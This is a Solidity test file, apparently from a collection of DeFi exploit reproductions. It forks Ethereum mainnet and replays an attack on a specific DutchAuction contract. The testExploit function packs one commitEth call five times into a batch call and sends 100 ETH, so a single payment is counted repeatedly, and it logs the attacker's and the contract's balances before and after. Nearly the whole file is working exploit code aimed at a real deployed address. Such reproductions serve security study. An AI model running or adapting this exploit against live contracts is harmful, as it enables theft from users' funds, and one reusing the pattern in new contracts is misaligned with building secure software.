// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "ds-test/test.sol";
import "./interface.sol";

interface IDutchAuction {
     function commitEth(
        address payable _beneficiary,
        bool readAndAgreedToMarketParticipationAgreement
    ) external payable;

    function batch(bytes[] calldata calls, bool revertOnFail) external payable returns (bool[] memory successes, bytes[] memory results);
}

contract ContractTest is DSTest {

    IDutchAuction DutchAuction = IDutchAuction(0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes[] public data;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 mainnetFork;
    
    function setUp() public {
        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 13038771); //fork mainnet at block 13038771
        cheats.selectFork(mainnetFork);
    }

    function testExploit() public{
          payable(address(0)).transfer(79228162414264337593543950335);
          emit log_named_uint("Before exploit, ETH balance of attacker:",address(address(this)).balance);
          emit log_named_uint("Before exploit, ETH balance of DutchAuction:",address(DutchAuction).balance);
          bytes memory payload = abi.encodePacked(DutchAuction.commitEth.selector,uint256(uint160(address(this))),uint256(uint8(0x01)));
          data.push(payload);
          data.push(payload);
          data.push(payload);
          data.push(payload);
          data.push(payload);
          DutchAuction.batch{value:100000000000000000000}(data,true);
          emit log_named_uint("After exploit, ETH balance of attacker:",address(address(this)).balance);
          emit log_named_uint("After exploit, ETH balance of DutchAuction:",address(DutchAuction).balance);
    }
    receive() external payable{}

}
